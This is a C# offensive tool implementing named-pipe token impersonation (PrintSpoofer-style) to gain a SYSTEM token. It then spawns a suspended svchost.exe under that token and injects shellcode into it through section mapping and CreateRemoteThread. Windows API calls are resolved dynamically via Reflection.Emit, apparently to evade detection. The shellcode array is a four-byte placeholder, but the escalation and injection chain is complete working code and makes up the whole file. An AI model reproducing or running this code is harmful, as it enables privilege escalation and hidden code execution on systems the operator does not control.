using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace Standard_Shellcode_Injection_Alternative_Dynamic_Invoke_PrintSpooferNet
{
    class Program
    {
        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Unicode
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine,
           UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            var parameterTypes = new Type[]
            {
                typeof(IntPtr), typeof(UInt32), typeof(string), typeof(string), typeof(UInt32),
                typeof(IntPtr), typeof(string), typeof(STARTUPINFO).MakeByRefType(), typeof(PROCESS_INFORMATION).MakeByRefType()
            };
            PROCESS_INFORMATION tempProcessInfo = new PROCESS_INFORMATION();
            var arguments = new object[] { hToken, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, tempProcessInfo };
            var result = (bool)DynamicInvoke(typeof(bool), "advapi32.dll", "CreateProcessWithTokenW", arguments, parameterTypes);
            lpStartupInfo = (STARTUPINFO)arguments[7];
            lpProcessInformation = (PROCESS_INFORMATION)arguments[8];
            return result;
        }
        public static IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances,
            uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes)
        {
            var parameterTypes = new Type[] { typeof(string), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(IntPtr) };
            var arguments = new object[] { lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "kernel32.dll", "CreateNamedPipeW", arguments, parameterTypes);
        }

        public static bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var arguments = new object[] { hNamedPipe, lpOverlapped };
            return (bool)DynamicInvoke(typeof(bool), "kernel32.dll", "ConnectNamedPipe", arguments, parameterTypes);
        }

        public static bool ImpersonateNamedPipeClient(IntPtr hNamedPipe)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hNamedPipe };
            return (bool)DynamicInvoke(typeof(bool), "advapi32.dll", "ImpersonateNamedPipeClient", arguments, parameterTypes);
        }

        public static bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(bool), typeof(IntPtr).MakeByRefType() };
            IntPtr tempTokenHandle = IntPtr.Zero;
            var arguments = new object[] { ThreadHandle, DesiredAccess, OpenAsSelf, tempTokenHandle };
            var result = (bool)DynamicInvoke(typeof(bool), "advapi32.dll", "OpenThreadToken", arguments, parameterTypes);
            TokenHandle = (IntPtr)arguments[3];
            return result;
        }


        public static UInt32 NtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
        {
            var parameterTypes = new Type[] { typeof(IntPtr).MakeByRefType(), typeof(UInt32), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(IntPtr) };
            var arguments = new object[] { section, desiredAccess, pAttrs, MaxSize, pageProt, allocationAttribs, hFile };
            var result = (UInt32)DynamicInvoke(typeof(UInt32), "ntdll.dll", "NtCreateSection", arguments, parameterTypes);
            section = (IntPtr)arguments[0];
            MaxSize = (long)arguments[3];
            return result;
        }

        public static UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
            IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
        {
            var parameterTypes = new Type[]
            {
                typeof(IntPtr), typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(IntPtr),
                typeof(long).MakeByRefType(), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(uint)
            };
            var arguments = new object[]
            {
                SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize,
                SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect
            };
            var result = (UInt32)DynamicInvoke(typeof(UInt32), "ntdll.dll", "NtMapViewOfSection", arguments, parameterTypes);
            BaseAddress = (IntPtr)arguments[2];
            SectionOffset = (long)arguments[5];
            ViewSize = (long)arguments[6];
            return result;
        }

        public static uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var arguments = new object[] { hProc, baseAddr };
            return (uint)DynamicInvoke(typeof(uint), "ntdll.dll", "NtUnmapViewOfSection", arguments, parameterTypes);
        }

        public static int NtClose(IntPtr hObject)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hObject };
            return (int)DynamicInvoke(typeof(int), "ntdll.dll", "NtClose", arguments, parameterTypes);
        }

        public static IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var arguments = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), "kernel32.dll", "CreateRemoteThread", arguments, parameterTypes);
        }

        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(uint), typeof(uint), typeof(IntPtr).MakeByRefType() };
            IntPtr tempNewToken = IntPtr.Zero;
            var arguments = new object[] { hExistingToken, dwDesiredAccess, lpTokenAttributes, ImpersonationLevel, TokenType, tempNewToken };
            var result = (bool)DynamicInvoke(typeof(bool), "advapi32.dll", "DuplicateTokenEx", arguments, parameterTypes);
            phNewToken = (IntPtr)arguments[5];
            return result;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                return;
            }

            // Shellcode
            byte[] Warhead = new byte[4] {0xfc,0x48,0x83,0xe4 };


            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken((IntPtr)(-2), 0xF01FF, false, out hToken);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            uint dwCreationFlags = 0x00000004 | 0x08000000;  // CREATE_SUSPENDED | CREATE_NO_WINDOW
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\svchost.exe", dwCreationFlags, IntPtr.Zero, null, ref si, out pi);

            long buffer_size = Warhead.Length;

            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, (IntPtr)(-1), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            Marshal.Copy(Warhead, 0, ptr_local_section_addr, Warhead.Length);

            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, pi.hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            NtUnmapViewOfSection((IntPtr)(-1), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
